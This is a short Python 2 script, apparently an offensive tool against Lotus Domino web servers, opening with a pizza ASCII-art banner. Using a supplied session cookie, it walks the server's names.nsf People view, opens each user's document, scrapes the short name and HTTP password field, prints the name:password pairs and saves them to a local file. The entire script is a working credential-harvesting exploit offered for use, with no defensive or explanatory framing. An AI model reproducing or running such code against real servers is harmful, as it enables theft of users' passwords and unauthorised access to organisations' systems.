import urllib2
import re
import string
import libxml2dom
import sys

########## CONFIG #############
COOKIE = ""
URL = ""
###############################

BANNER = '''
                         ~~--.
                        |%=@%%/
                        |o%%%/
                     __ |%%o/
               _,--~~ | |(_/ ._
            ,/'  m%%%%| |o/ /  `\.
           /' m%%o(_)%| |/ /o%%m `\\
         /' %%@=%o%%%o|   /(_)o%%% `\\
        /  %o%%%%%=@%%|  /%%o%%@=%%  \\
       |  (_)%(_)%%o%%| /%%%=@(_)%%%  |
       | %%o%%%%o%%%(_|/%o%%o%%%%o%%% |
       | %%o%(_)%%%%%o%(_)%%%o%%o%o%% |
       |  (_)%%=@%(_)%o%o%%(_)%o(_)%  |
        \ ~%%o%%%%%o%o%=@%%o%%@%%o%~ /
         \. ~o%%(_)%%%o%(_)%%(_)o~ ,/
           \_ ~o%=@%(_)%o%%(_)%~ _/
             `\_~~o%%%o%%%%%~~_/'
                `--..____,,--'

	Domino says: DID YOU ORDER PIZZA?
'''
print BANNER

if len(sys.argv) < 3:
	print " You haven't specified Cookie and URL parameters."
	print " Usage:\n "+sys.argv[0]+" <cookie> <target url>\n"
	print " Example:\n "+sys.argv[0]+" DomAuthSessId=F7443F09406D6DF465912D8F1AE49EA5 http://ilovepizzaanddominolotus.com\n"
	print " Exiting. Bye bye.\n"
	exit(1)

COOKIE	= sys.argv[1]
URL	= sys.argv[2]

db = dict()
opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', COOKIE))
f = opener.open(URL + "/names.nsf/People?OpenView")
index = f.read()
lll = re.findall(r"[0-9a-zA-Z]{32}/[0-9a-zA-Z]{32}\?OpenDocument", index)

for us in lll:
	user_opener = urllib2.build_opener()
	user_opener.addheaders.append(('Cookie', COOKIE))
	user_f = user_opener.open(URL + "/names.nsf/"+us)
	user_data = user_f.read()
	doc = libxml2dom.parseString(user_data, html=1)
	input_tags = doc.getElementsByTagName("input")
	name 	= ""
	passw 	= ""
	for dspname in input_tags:
		tag = dspname.toString()
		if "dspShortName" in tag:
			coord_start = string.find(tag, "value=\"")
			name = tag[coord_start+7:-2]
		if "dspHTTPPassword" in tag:
			coord_start = string.find(tag, "value=\"")
			passw = tag[coord_start+7:-2]
	print name+":"+passw			
	db[name] = passw

output = open("dominoLotusFetch.txt","a")
output.write(str(db))
output.close()

for i in db.itervalues():
	if i != '':
		print i

